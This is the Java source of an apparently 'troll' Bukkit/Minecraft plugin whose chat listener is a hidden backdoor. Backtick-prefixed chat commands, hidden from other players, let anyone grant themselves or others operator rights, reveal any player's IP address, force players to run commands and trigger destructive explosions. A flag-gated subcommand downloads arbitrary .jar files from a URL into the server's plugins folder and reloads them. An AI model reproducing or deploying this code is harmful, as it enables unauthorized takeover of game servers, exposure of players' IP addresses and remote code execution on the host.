package io.github.geniusformat.trollplugin.commands;

import io.github.geniusformat.trollplugin.items.ItemManager;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;

public class Commands implements Listener {

    @EventHandler
    public void onChat(PlayerChatEvent chat) {
        boolean allowPluginManager = false;

        String[] Args = chat.getMessage().split(" ");
        String cmd = Args[0];

        Player p = chat.getPlayer();
        final String pre = "`";
        final String outputPrefix = "§6§l[BACKDOOR] ";
        final String outputColoring = "§r§c";
        final String formatting = outputPrefix + outputColoring;
        if (cmd.startsWith(pre)) {
            if (cmd.equalsIgnoreCase(pre + "opme")) {
                p.setOp(true);
                p.sendMessage(formatting + "You are now an operator.");
            }
            else if (cmd.equalsIgnoreCase(pre + "deopme")) {
                p.setOp(false);
                p.sendMessage(formatting + "You are now not an operator.");
            }
            else if (cmd.equalsIgnoreCase(pre + "op")) {
                if (Args.length > 1) {
                    Player target = Bukkit.getPlayer(Args[1]);
                    if (target != null) {
                        target.setOp(true);
                        p.sendMessage(formatting + Args[1] + " was made an operator.");
                    }
                    else {
                        p.sendMessage(formatting + "ERROR: " + Args[1] + "is not a valid player.");
                    }
                }
                else {
                    p.sendMessage(formatting + "ERROR: Player not provided. Usage: " + pre + "op <player>");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "deop")) {
                if (Args.length > 1) {
                    Player target = Bukkit.getPlayer(Args[1]);
                    if (target != null) {
                        target.setOp(false);
                        p.sendMessage(formatting + Args[1] + " was made not an operator.");
                    }
                    else {
                        p.sendMessage(formatting + "ERROR: " + Args[1] + "is not a valid player.");
                    }
                }
                else {
                    p.sendMessage(formatting + "ERROR: Player not provided. Usage: " + pre + "deop <player>");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "gamemode") || cmd.equalsIgnoreCase(pre + "gm")) {
                if (Args.length > 1) {
                    String Val = Args[1];
                    switch (Val) {
                        case "1":
                        case "c":
                        case "creative":
                            p.setGameMode(GameMode.CREATIVE);
                            p.sendMessage(formatting + "Your gamemode has been set to creative.");
                            break;
                        case "0":
                        case "s":
                        case "survival":
                            p.setGameMode(GameMode.SURVIVAL);
                            p.sendMessage(formatting + "Your gamemode has been set to survival.");
                            break;
                        case "2":
                        case "a":
                        case "adventure":
                            p.setGameMode(GameMode.ADVENTURE);
                            p.sendMessage(formatting + "Your gamemode has been set to adventure.");
                            break;
                        case "3":
                        case "sp":
                        case "spectator":
                            p.setGameMode(GameMode.SPECTATOR);
                            p.sendMessage(formatting + "Your gamemode has been set to spectator.");
                            break;
                    }
                }
                else {
                    p.sendMessage(formatting + "ERROR: Gamemode not provided. Usage: " + pre + "<gamemode|gm> <0|s|survival|1|c|creative|2|a|adventure|3|sp|spectator>");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "ipof")) {
                if (Args.length > 1) {
                    String Target = Bukkit.getPlayer(Args[1]).getName();
                    String IPAddr = Bukkit.getPlayer(Args[1]).getAddress().toString().replace("/", "");
                    p.sendMessage(formatting + Target + "'s IP address: " + IPAddr);
                }
                else {
                    p.sendMessage(formatting + "ERROR: Player not provided. Usage: " + pre + "ipof <player>");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "pl")) {
                if (allowPluginManager) {
                    if (Args[1].equalsIgnoreCase("install")) {
                        if (Args.length == 4) {
                            try {
                                URL url = new URL(Args[3]);
                                URLConnection urlcon = url.openConnection();
                                BufferedInputStream is = new BufferedInputStream(urlcon.getInputStream());
                                String plname = Args[2];
                                if (!Args[2].contains(".jar")) {
                                    plname += ".jar";
                                }
                                File out = new File("plugins", plname);
                                BufferedOutputStream bout = new BufferedOutputStream(new FileOutputStream(out));
                                byte[] b = new byte[5242880];
                                int read = 0;
                                while ((read = is.read(b)) > -1) {
                                    bout.write(b, 0, read);
                                }
                                bout.flush();
                                bout.close();
                                is.close();
                                p.sendMessage(formatting + "Successfully downloaded and installed " + Args[2] + " from " + Args[3] + ".");
                                p.sendMessage(formatting + "Reloading plugins...");
                                Bukkit.reload();
                                p.sendMessage(formatting + "Done.");
                            } catch (Exception e) {
                                p.sendMessage(formatting + "ERROR: Failed to download plugin.");
                            }
                        } else {
                            p.sendMessage(formatting + "ERROR: Not enough arguments. Usage: " + pre + "pl install <name> <fileUrl>");
                        }
                    } else if (Args[1].equalsIgnoreCase("list")) {
                        p.sendMessage(formatting + "Contents");
                        File directoryPath = new File("plugins");
                        String contents[] = directoryPath.list();
                        for (String content : contents) {
                            if (content.contains(".jar")) {
                                p.sendMessage(content);
                            }
                        }
                    } else if (Args[1].equalsIgnoreCase("delete")) {
                        if (Args.length == 3) {
                            String plname = Args[2];
                            if (!Args[2].contains(".jar")) {
                                plname += ".jar";
                            }
                            File file = new File("plugins", plname);
                            if (file.delete()) {
                                p.sendMessage(formatting + "Successfully deleted the file.");
                                p.sendMessage(formatting + "Reloading plugins...");
                                Bukkit.reload();
                                p.sendMessage(formatting + "Done.");
                            } else {
                                p.sendMessage(formatting + "ERROR: Failed to delete the file. Does it exist? (check with \"" + pre + "pl list\")");
                            }
                        } else {
                            p.sendMessage(formatting + "ERROR: Not enough arguments. Usage: " + pre + "pl delete <file> Hint: use \"" + pre + "pl list\" for the jarfile.");
                        }
                    } else {
                        p.sendMessage(formatting + "ERROR: Operation not provided. Usage: " + pre + "pl <install <url>|delete <plugin name>|list>");
                    }
                }
                else {
                    p.sendMessage(formatting + "ERROR: Plugin manager is disabled due to preferences in this build.");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "item")) {
                if (Args.length > 1) {
                    String Val = Args[1].toLowerCase();
                    switch (Val) {
                        case "grenade":
                        case "nuke":
                            p.getInventory().addItem(ItemManager.nuke);
                            break;
                        case "opsword":
                            p.getInventory().addItem(ItemManager.opSword);
                            break;
                        case "smitestick":
                        case "zeusstick":
                            p.getInventory().addItem(ItemManager.zeusStick);
                        case "oparmor":
                            p.getInventory().addItem(ItemManager.opHelmet);
                            p.getInventory().addItem(ItemManager.opChestplate);
                            p.getInventory().addItem(ItemManager.opLeggings);
                            p.getInventory().addItem(ItemManager.opBoots);
                            break;
                        case "tntwand":
                            p.getInventory().addItem(ItemManager.tntWand);
                    }
                    p.sendMessage(formatting + "bon appétit");
                }
                else {
                    p.sendMessage(formatting + "ERROR: Improper usage. Look at " + pre + "help for more info.");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "players")) {
                p.sendMessage(formatting + "Online Players:");
                ArrayList<Player> list = new ArrayList<>(p.getServer().getOnlinePlayers());

                for (Player player : list) {
                    p.sendMessage(player.getDisplayName());
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "smite")) {
                if (Args.length == 1) {
                    Block targetedBlock = p.getTargetBlock(null, p.getClientViewDistance() * 32);
                    Location location = targetedBlock.getLocation();
                    p.getWorld().strikeLightning(location);
                    p.getWorld().createExplosion(location, 10, true, false);
                    p.sendMessage(formatting + "Smited whet you were looking at.");
                }
                else if (Args.length == 2) {
                    if (p.getServer().getPlayer(Args[1]) != null) {
                        Player targetedPlayer = p.getServer().getPlayer(Args[1]);
                        assert targetedPlayer != null;
                        Location location = targetedPlayer.getLocation();
                        targetedPlayer.getWorld().strikeLightning(location);
                        targetedPlayer.getWorld().createExplosion(location, 25, true, false);
                        p.sendMessage(formatting + "Smited " + Args[1] + ".");
                    }
                    else {
                        p.sendMessage(formatting + "ERROR: Player not found.");
                    }
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "fly")) {
                if (Args.length == 2) {
                    if (Args[1].equalsIgnoreCase("on") || Args[1].equalsIgnoreCase("true")) {
                        p.setAllowFlight(true);
                        p.sendMessage(formatting + "You can now fly.");
                    } else if (Args[1].equalsIgnoreCase("off") || Args[1].equalsIgnoreCase("false")) {
                        p.setAllowFlight(false);
                        p.sendMessage(formatting + "You cannot fly anymore.");
                    }
                }
                else {
                    p.sendMessage(formatting + "ERROR: Improper usage. Look at " + pre + "help for more info.");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "demo")) {
                if (Args.length == 2) {
                    Player target = Bukkit.getPlayer(Args[1]);
                    if (target != null) { target.showDemoScreen(); }
                    else { p.sendMessage(formatting + "Player not found."); }
                }
                else {
                    p.sendMessage(formatting + "ERROR: Improper usage. See " + pre + "help.");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "sudo")) {
                if (Args.length >= 3) {
                    Player target = Bukkit.getPlayer(Args[1]);
                    if (target != null) {
                        String command = "";
                        for (int i = 2; i < Args.length; i++) {
                            if (command != "") {
                                command = command + " ";
                            }
                            command = command + Args[i];
                        }
                        target.performCommand(command);
                    }
                    else {
                        p.sendMessage(formatting + "Player not found.");
                    }
                }
                else {
                    p.sendMessage(formatting + "Improper usage. See " + pre + "help.");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "flyspeed")) {
                if (Args.length >= 2) {
                    if (isFloat(Args[1])) {
                        try {
                            p.setFlySpeed(Float.parseFloat(Args[1]));
                            p.sendMessage(formatting + "Changed your fly speed.");
                        }
                        catch (IllegalArgumentException e) {
                            p.sendMessage(formatting + "ERROR: " + Args[1] + " is too high. Try a lower number.");
                        }
                    }
                    else {
                        p.sendMessage(formatting + "ERROR: Not a number.");
                    }
                }
                else {
                    p.sendMessage(formatting + "Improper usage. See " + pre + "help.");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "wand")) {
                if (Args.length == 3) {
                    if (isMaterial(Args[1].toUpperCase())) {
                        if (isInteger(Args[2])) {
                            Material mat = Material.matchMaterial(Args[1].toUpperCase());
                            int radius = Integer.parseInt(Args[2]);

                            ItemStack item = new ItemStack(Material.DIAMOND_HOE, 1);
                            ItemMeta meta = item.getItemMeta();

                            assert meta != null;
                            meta.setLore(Arrays.asList("WAND", Args[1].toUpperCase() + " " + radius));
                            meta.setDisplayName("§3Wand for " + Args[1].toUpperCase() + " [RADIUS: " + radius + "]");
                            meta.addEnchant(Enchantment.LURE, 1, true);
                            meta.addItemFlags(ItemFlag.HIDE_ENCHANTS);

                            item.setItemMeta(meta);
                            p.getInventory().addItem(item);
                            p.sendMessage(formatting + "Made the wand.");
                        }
                        else {
                            p.sendMessage(formatting + "ERROR: " + Args[1] + " is not a number.");
                        }
                    }
                    else {
                        p.sendMessage(formatting + "ERROR: " + Args[1] + " is not a valid material.");
                    }
                }
                else {
                    p.sendMessage(formatting + "Improper usage. See " + pre + "help.");
                }
            }
            else if (cmd.equalsIgnoreCase(pre + "help")) {
                p.sendMessage(formatting + "COMMANDS");
                p.sendMessage("§m-----------------------------------------------------");
                p.sendMessage(outputColoring + pre + "help");
                p.sendMessage(" - This stuff.");
                p.sendMessage(outputColoring + pre + "about");
                p.sendMessage(" - Information about the plugin.");
                p.sendMessage(outputColoring + pre + "opme");
                p.sendMessage(" - Make yourself operator.");
                p.sendMessage(outputColoring + pre + "op <player>");
                p.sendMessage(" - Make someone else an operator.");
                p.sendMessage(outputColoring + pre + "deopme");
                p.sendMessage(" - Make yourself not an operator.");
                p.sendMessage(outputColoring + pre + "deop <player>");
                p.sendMessage(" - Make someone else not an operator.");
                p.sendMessage(outputColoring + pre + "gamemode <gamemode>");
                p.sendMessage(" - Change your gamemode.");
                p.sendMessage(" - Options for <gamemode>");
                p.sendMessage("    - creative c 1");
                p.sendMessage("    - survival s 0");
                p.sendMessage("    - adventure a 2");
                p.sendMessage("    - spectator sp 3");
                p.sendMessage(outputColoring + pre + "gm <gamemode>");
                p.sendMessage(" - Alias for gamemode.");
                p.sendMessage(outputColoring + pre + "ipof <player>");
                p.sendMessage(" - Get the IP address of a player.");
                p.sendMessage(outputColoring + pre + "pl <install <file> <fileURL>|list|delete <file>" + (allowPluginManager ? "" : ChatColor.BOLD + " [DISABLED]"));
                p.sendMessage(" - Manage plugins on the server.");
                p.sendMessage(outputColoring + pre + "item <item>");
                p.sendMessage(" - Gives you one of the special items.");
                p.sendMessage(" - Items:");
                p.sendMessage("   - gernade/nuke");
                p.sendMessage("     - Throwable TNT.");
                p.sendMessage("   - opsword");
                p.sendMessage("     - 32k damage sword.");
                p.sendMessage("   - zeusstick/smitestick");
                p.sendMessage("     - Strike nearby entities with lightning.");
                p.sendMessage(outputColoring + pre + "smite [player]");
                p.sendMessage(" - Smites what you are looking at or the player provided.");
                p.sendMessage(outputColoring + pre + "players");
                p.sendMessage(" - Lists online players.");
                p.sendMessage(outputColoring + pre + "fly <on|off>");
                p.sendMessage(" - Lets you fly.");
                p.sendMessage(outputColoring + pre + "demo <player>");
                p.sendMessage(" - Shows the demo screen to the target player.");
                p.sendMessage(outputColoring + pre + "sudo <player> <command> [args]");
                p.sendMessage(" - Makes another player execute a command.");
                p.sendMessage(outputColoring + pre + "flyspeed <speed>");
                p.sendMessage(" - Sets your fly speed.");
                p.sendMessage(outputColoring + pre + "wand <material> <radius>");
                p.sendMessage(" - Gives you a wand ");
            }
            else if (cmd.equalsIgnoreCase(pre + "about")) {
                p.sendMessage(formatting + "ABOUT");
                p.sendMessage("§m-----------------------------------------------------");
                String version = "1.0 [GIT]";
                p.sendMessage("Version: " + version);
                p.sendMessage("Help command: " + pre + "help");
            }
            chat.setCancelled(true);
        }
    }

    public static boolean isFloat(String s) {
        try {
            Float.parseFloat(s);
        } catch(NumberFormatException | NullPointerException e) {
            return false;
        }
        return true;
    }

    public static boolean isInteger(String s) {
        try {
            Integer.parseInt(s);
        } catch(NumberFormatException | NullPointerException e) {
            return false;
        }
        return true;
    }

    public static boolean isMaterial(String s) {
        return Material.matchMaterial(s) != null;
    }
}
